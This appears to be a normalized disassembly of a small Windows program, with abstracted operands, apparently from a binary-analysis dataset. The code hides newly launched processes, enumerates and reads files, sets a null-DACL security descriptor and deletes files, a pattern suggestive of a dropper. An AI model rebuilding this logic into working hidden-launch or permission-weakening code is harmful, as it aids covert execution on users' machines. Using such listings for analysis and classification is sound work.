sub_401000
push ebp
mov ebp esp
sub esp 0x54
push esi
push 0x44
pop eax
xor esi esi
mov [ ebp - 0x54 ] eax
push eax
lea eax [ ebp - 0x54 ]
push esi
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x81
mov [ ebp - 0x24 ] si
push eax
lea eax [ ebp - 0x54 ]
push eax
push esi
push esi
push 0x20
push esi
push esi
push esi
push [ ebp + 0x8 ]
push esi
call [ CreateProcessA@IAT ]
neg eax
sbb eax eax
pop esi
inc eax
leave
retn
sub_401049
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_40130b
push esi
call strlen
pop ecx
pop ecx
and [ eax + esi + 0x1 ] 0x0
xor eax eax
pop esi
retn
test eax eax
jg r-xdata
dec eax
cmp [ eax + esi ] 0x20
jne r-xdata
sub_40109e
push ebp
mov ebp esp
sub esp 0x3c0
push ebx
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x2bc ]
push 0xa
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x2b2 ]
push 0x8
[ edi ]
pop ecx
mov esi rw-data
lea edi [ ebp - 0x28a ]
push 0x9
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea edi [ ebp - 0x268 ]
mov esi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea edi [ ebp - 0x258 ]
pop edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx edx
xor eax eax
lea edi [ ebp - 0x24a ]
mov esi rw-data
[ edi ]
lea edi [ ebp - 0x226 ]
push 0xb
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop ecx
lea edi [ ebp - 0x223 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov esi rw-data
lea edi [ ebp - 0x1f4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx edx
xor eax eax
lea edi [ ebp - 0x1e7 ]
mov ebx rw-data
[ edi ]
stosb [ edi ]
mov esi ebx
lea edi [ ebp - 0x1c2 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx edx
xor eax eax
lea edi [ ebp - 0x1b7 ]
mov esi rw-data
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea edi [ ebp - 0x190 ]
mov ecx edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
lea edi [ ebp - 0x182 ]
[ edi ]
mov esi rw-data
lea edi [ ebp - 0x15e ]
push 0x8
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop ecx
lea edi [ ebp - 0x14c ]
[ edi ]
mov esi rw-data
lea edi [ ebp - 0x12c ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0xa
lea edi [ ebp - 0x125 ]
pop ecx
mov edx rw-data
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x8
mov esi edx
pop ecx
lea edi [ ebp - 0xfa ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor eax eax
lea edi [ ebp - 0xd7 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
mov esi rw-data
lea edi [ ebp - 0xc8 ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0xb
xor eax eax
pop ecx
lea edi [ ebp - 0xc2 ]
[ edi ]
push 0x8
mov esi edx
pop ecx
lea edi [ ebp - 0x96 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
lea edi [ ebp - 0x73 ]
mov esi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
lea edi [ ebp - 0x64 ]
push 0xa
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x5b ]
mov esi ebx
[ edi ]
stosb [ edi ]
lea edi [ ebp - 0x32 ]
push 0x9
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x27 ]
[ edi ]
stosw [ edi ]
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
stosb [ edi ]
push esi
call [ DoEnvironmentSubstA@IAT ]
cmp [ esi ] 0x25
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
xor ebx ebx
lea edi [ ebp - 0x2bc ]
mov eax ebx
imul eax eax 0x64
lea eax [ ebp + eax - 0x28a ]
push eax
lea eax [ ebp - 0x3c0 ]
push rw-data
push eax
call sprintf
push 0x25
push esi
call strrchr
inc eax
push eax
lea eax [ ebp - 0x3c0 ]
push eax
call strcat
add esp 0x1c
inc ebx
add edi 0x64
cmp ebx 0x7
jl r-xdata
lea eax [ ebp - 0x3c0 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x3c0 ]
push eax
push esi
call strncpy
lea eax [ ebp - 0x3c0 ]
push eax
call strlen
add esp 0x14
and [ eax + esi ] 0x0
lea eax [ ebp - 0x3c0 ]
push rw-data
push eax
call sprintf
push 0x25
push esi
call strrchr
inc eax
push eax
lea eax [ ebp - 0x3c0 ]
push eax
call strcat
add esp 0x18
push edi
call strlen
push eax
push edi
push esi
call strncmp
add esp 0x10
test eax eax
je r-xdata
jmp r-xdata
cmp ebx 0x7
jl r-xdata
sub_40130b
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call strlen
pop ecx
mov edi eax
xor ecx ecx
test edi edi
jle r-xdata
pop edi
xor eax eax
pop esi
retn
push ebx
mov edx eax
sub edx 0x20
je r-xdata
je r-xdata
test [ ecx + esi ] 0x20
je r-xdata
sub edx 0x20
je r-xdata
test [ ecx + esi ] 0x10
je r-xdata
mov edx eax
dec edx
je r-xdata
and bl 0xbf
or bl 0x40
jmp r-xdata
test [ ecx + esi ] 0x40
je r-xdata
sub edx 0x40
jne r-xdata
and bl 0xfd
jmp r-xdata
or bl 0x2
jmp r-xdata
test [ ecx + esi ] 0x1
je r-xdata
dec edx
je r-xdata
cmp eax 0x10
jg r-xdata
mov [ ecx + esi ] bl
inc ecx
cmp ecx edi
jl r-xdata
cdq
sub eax edx
sar eax 0x1
test eax eax
jg r-xdata
and bl 0xdf
jmp r-xdata
or bl 0x20
jmp r-xdata
test [ ecx + esi ] 0x80
je r-xdata
and bl 0xfe
jmp r-xdata
or bl 0x1
jmp r-xdata
test [ ecx + esi ] 0x2
je r-xdata
dec edx
dec edx
je r-xdata
xor bl bl
mov eax 0x80
pop ebx
and bl 0x7f
jmp r-xdata
or bl 0x80
jmp r-xdata
and bl 0xef
jmp r-xdata
or bl 0x10
jmp r-xdata
test [ ecx + esi ] 0x4
je r-xdata
sub edx 0x4
jne r-xdata
and bl 0xfb
jmp r-xdata
or bl 0x4
jmp r-xdata
test [ ecx + esi ] 0x8
je r-xdata
and bl 0xf7
jmp r-xdata
or bl 0x8
jmp r-xdata
sub_4013f9
push ebp
mov ebp esp
sub esp 0x858
push ebx
push esi
push edi
push 0x2e
push [ ebp + 0x8 ]
call strrchr
inc eax
push eax
lea eax [ ebp - 0x858 ]
push eax
call strcpy
lea eax [ ebp - 0x858 ]
push rw-data
push eax
call _stricmp
add esp 0x18
xor ebx ebx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x858 ]
push eax
call strcpy
pop ecx
pop ecx
push rw-data
push [ ebp + 0x8 ]
call fopen
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x44
lea eax [ ebp - 0x54 ]
pop esi
push esi
push ebx
push eax
call memset
push 0x10
lea eax [ ebp - 0x10 ]
push ebx
push eax
call memset
add esp 0x18
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x28 ] 0x81
push eax
lea eax [ ebp - 0x54 ]
push eax
push ebx
push ebx
push 0x20
push ebx
push ebx
lea eax [ ebp - 0x858 ]
push ebx
push eax
push ebx
mov [ ebp - 0x24 ] 0x5
call [ CreateProcessA@IAT ]
neg eax
sbb eax eax
neg eax
jmp r-xdata
mov [ ebp - 0x858 ] bl
jmp r-xdata
mov esi [ ebp + 0xc ]
mov eax 0x800
cmp esi eax
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x858 ] bl
je r-xdata
push edi
push esi
lea eax [ ebp - 0x858 ]
push 0x1
push eax
call fread
push edi
call fclose
mov ecx 0x100
add esp 0x14
cmp esi ecx
jbe r-xdata
mov esi eax
cmp [ ebp + ecx - 0x858 ] 0x3a
jne r-xdata
inc ecx
cmp ecx esi
jb r-xdata
cmp [ ebp + ecx - 0x857 ] 0x5c
je r-xdata
cmp ecx esi
jae r-xdata
lea eax [ ecx - 0x1 ]
xor edi edi
cmp eax esi
jae r-xdata
mov [ ebp + edi - 0x858 ] bl
jmp r-xdata
push 0x1
pop edx
sub edx ecx
jmp r-xdata
mov cl [ ebp + eax - 0x858 ]
cmp cl bl
je r-xdata
lea ebx [ edx + eax ]
inc edi
inc eax
cmp eax esi
mov [ ebp + ebx - 0x858 ] cl
jb r-xdata
xor ebx ebx
xor ebx ebx
sub_401554
push ebp
mov ebp esp
sub esp 0x104
push ebx
push esi
push edi
push rw-data
push rw-data
call fopen
mov ebx eax
pop ecx
test ebx ebx
pop ecx
mov esi 0x104
je r-xdata
lea eax [ ebp - 0x104 ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
push ebx
push esi
lea eax [ ebp - 0x104 ]
push 0x1
push eax
call fread
push ebx
mov edi eax
call fclose
and [ ebp + edi - 0x104 ] 0x0
lea eax [ ebp - 0x104 ]
push eax
call sub_40130b
add esp 0x18
jmp r-xdata
lea eax [ ebp - 0x104 ]
mov edi rw-data
push eax
push edi
call strcpy
push esi
push edi
call sub_40109e
add esp 0x10
xor eax eax
pop edi
pop esi
pop ebx
leave
retn
sub_4015e3
push ebp
mov ebp esp
sub esp 0x244
push ebx
push edi
call sub_401554
mov ebx rw-data
lea eax [ ebp - 0x244 ]
push ebx
push rw-data
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x244 ]
push eax
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
pop edi
xor eax eax
pop ebx
leave
retn
lea eax [ ebp - 0x140 ]
push esi
mov esi [ FindNextFileA@IAT ]
push eax
push edi
push edi
call [ FindClose@IAT ]
pop esi
test [ ebp - 0x140 ] 0x16
jne r-xdata
lea eax [ ebp - 0x140 ]
push eax
push edi
jmp r-xdata
lea eax [ ebp - 0x114 ]
push eax
push ebx
lea eax [ ebp - 0x244 ]
push rw-data
push eax
call sprintf
push [ ebp - 0x120 ]
lea eax [ ebp - 0x244 ]
push eax
call sub_4013f9
add esp 0x18
call esi
test eax eax
je r-xdata
sub_40168c
sub esp 0x228
mov ax [ rw-data ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x12 ] ax
call [ GetVersion@IAT ]
movzx ecx al
mov [ rw-data ] ecx
xor ecx ecx
mov cl ah
mov [ rw-data ] eax
movzx eax cl
mov esi rw-data
mov [ rw-data ] eax
push esi
call sub_401049
push esi
call strlen
push eax
push esi
mov esi rw-data
push esi
call strncpy
mov edi 0x104
push edi
push esi
call sub_40109e
push rw-data
call sub_401049
mov ebp rw-data
push ebp
call sub_401049
push rw-data
call sub_401049
push rw-data
call sub_401049
mov ebx rw-data
push ebx
call sub_401049
push ebx
mov ebx rw-data
push esi
push ebx
push rw-data
call sprintf
add esp 0x40
push rw-data
push esi
push ebx
push rw-data
call sprintf
push rw-data
push esi
push ebx
push rw-data
call sprintf
push rw-data
push esi
push ebx
push rw-data
call sprintf
add esp 0x30
lea eax [ esp + 0x30 ]
push edi
push eax
call [ GetSystemDirectoryA@IAT ]
push ebp
lea eax [ esp + 0x34 ]
mov ebp rw-data
push eax
push ebp
push rw-data
call sprintf
lea eax [ esp + 0x40 ]
push rw-data
push eax
push ebp
push rw-data
call sprintf
push rw-data
lea eax [ esp + 0x54 ]
push eax
push ebp
push rw-data
call sprintf
mov ebp rw-data
push ebp
call sub_401049
push ebp
push esi
mov ebp rw-data
push ebx
push ebp
call sprintf
add esp 0x44
push edi
push ebp
call sub_40109e
mov ebp rw-data
push ebp
call sub_401049
push ebp
call strlen
push eax
push ebp
mov ebp rw-data
push ebp
call strncpy
push edi
push ebp
call sub_40109e
mov ebp rw-data
push ebp
call sub_401049
push ebp
call strlen
push eax
push ebp
mov ebp rw-data
push ebp
call strncpy
push edi
push ebp
call sub_40109e
add esp 0x40
push rw-data
call sub_401049
mov [ esp ] rw-data
call sub_401049
mov [ esp ] rw-data
call sub_401049
mov [ esp ] rw-data
call sub_401049
mov [ esp ] rw-data
call sub_401049
mov [ esp ] rw-data
call sub_401049
mov [ esp ] rw-data
call sub_401049
mov [ esp ] rw-data
call sub_401049
mov [ esp ] rw-data
call sub_401049
mov [ esp ] rw-data
call sub_401049
pop ecx
call sub_401070
test eax eax
je r-xdata
xor edi edi
push 0x1
call _sleep
pop ecx
xor edi edi
push edi
push edi
push edi
call [ GetCurrentThreadId@IAT ]
push eax
call [ PostThreadMessageA@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] edi
mov edi [ PathFileExistsA@IAT ]
push ebp
mov [ rw-data ] 0xc
mov [ rw-data ] 0x1
call edi
test eax eax
jne r-xdata
mov edi rw-data
push 0x1
push edi
call [ InitializeSecurityDescriptor@IAT ]
push 0x0
push 0x0
push 0x1
push edi
call [ SetSecurityDescriptorDacl@IAT ]
push edi
push edi
lea eax [ esp + 0x1c ]
push edi
push eax
call [ GetMessageA@IAT ]
jmp r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
push ebp
call sub_401000
pop ecx
mov ebp rw-data
push ebp
call edi
test eax eax
je r-xdata
call sub_401070
test eax eax
je r-xdata
call sub_4015e3
lea eax [ esp + 0x124 ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
push rw-data
call sub_401000
lea eax [ esp + 0x16 ]
push eax
push esi
lea eax [ esp + 0x140 ]
push ebx
push eax
call sprintf
add esp 0x14
lea eax [ esp + 0x134 ]
push eax
call edi
pop edi
pop esi
pop ebp
pop ebx
test eax eax
je r-xdata
xor eax eax
add esp 0x228
retn 0x10
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401b59
cmp [ rw-data ] ebx
jne r-xdata
call sub_401b44
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401b56
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_40168c
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
memset
jmp [ memset@IAT ]
strlen
jmp [ strlen@IAT ]
strncpy
jmp [ strncpy@IAT ]
strcat
jmp [ strcat@IAT ]
strrchr
jmp [ strrchr@IAT ]
sprintf
jmp [ sprintf@IAT ]
strncmp
jmp [ strncmp@IAT ]
fclose
jmp [ fclose@IAT ]
fread
jmp [ fread@IAT ]
fopen
jmp [ fopen@IAT ]
strcpy
jmp [ strcpy@IAT ]
_sleep
jmp [ _sleep@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401b44
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401b56
xor eax eax
retn
sub_401b59
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
_stricmp
jmp [ _stricmp@IAT ]
